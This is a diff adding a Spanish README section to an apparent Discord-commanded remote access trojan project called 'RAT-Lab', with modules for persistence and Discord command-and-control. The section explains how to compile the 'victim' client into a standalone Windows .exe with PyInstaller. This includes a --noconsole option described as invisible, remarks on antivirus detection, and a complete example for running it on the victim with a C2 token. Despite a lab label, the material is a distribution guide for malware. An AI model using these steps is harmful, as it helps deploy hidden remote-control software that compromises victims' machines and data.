@@ -363,6 +363,97 @@ Los comandos se escriben en el canal de Discord con prefijo `!`:
 
 ---
 
+## 📦 Crear archivo .exe para distribución (Windows)
+
+Para distribuir el payload como un archivo `.exe` ejecutable en Windows sin necesidad de Python instalado:
+
+### Paso 1: Consolidar los archivos (opcional pero recomendado)
+
+Para crear un `.exe` funcional, puedes unir todos los módulos en un solo archivo:
+
+```
+victim/
+├── client.py                  # ← Consolidar todo aquí
+└── modules/                   # ← Se puede eliminar después
+    ├── environment.py
+    ├── persistence.py
+    ├── intelligence.py
+    ├── discord_c2.py
+    └── commands.py
+```
+
+**Ventajas de consolidar:**
+- Un solo archivo `.exe` más limpio
+- Menos problemas de imports
+- Distribución más simple
+
+### Paso 2: Instalar PyInstaller
+
+```bash
+pip install pyinstaller
+```
+
+### Paso 3: Crear el .exe
+
+```bash
+cd victim
+
+# Opción básica (con ventana de terminal)
+pyinstaller --onefile client.py
+
+# Opción sin ventana (invisible)
+pyinstaller --onefile --noconsole client.py
+
+# Opción con nombre personalizado
+pyinstaller --onefile --noconsole --name=RAT-Lab client.py
+```
+
+### Resultado
+
+```
+victim/
+├── dist/
+│   └── client.exe    ← Archivo ejecutable (~30-50 MB)
+└── build/            ← Archivos temporales (se puede borrar)
+```
+
+### Características del .exe
+
+| Característica | Descripción |
+|----------------|-------------|
+| Tamaño | ~30-50 MB (incluye Python + librerías) |
+| Sistema | Solo Windows |
+| Python | No necesario en la víctima |
+| Ejecución | Doble clic para ejecutar |
+
+### ⚠️ Consideraciones importantes
+
+1. **Antivirus:** Los archivos `.exe` creados con PyInstaller pueden ser detectados por antivirus (falso positivo o real). Esto es relevante para el laboratorio.
+
+2. **Token:** El `.exe` debe tener el token y channel ID configurados. Puedes:
+   - Pasarlos por argumentos: `client.exe --token XXX --channel YYY`
+   - O incrustarlos en el código antes de compilar
+
+3. **Sistema operativo:** El `.exe` solo funciona en Windows (el código usa APIs de Windows como `winreg`, `ctypes.windll`)
+
+### Ejemplo completo
+
+```bash
+# 1. Navegar a la carpeta de la víctima
+cd victim
+
+# 2. Instalar PyInstaller
+pip install pyinstaller
+
+# 3. Crear el .exe
+pyinstaller --onefile --noconsole --name=RAT-Lab client.py
+
+# 4. Ejecutar en la víctima
+dist\RAT-Lab.exe --token TU_TOKEN --channel TU_CHANNEL
+```
+
+---
+
 ## 📚 Documentación adicional
 
 - [DISCLAIMER.md](DISCLAIMER.md) — Aviso legal completo
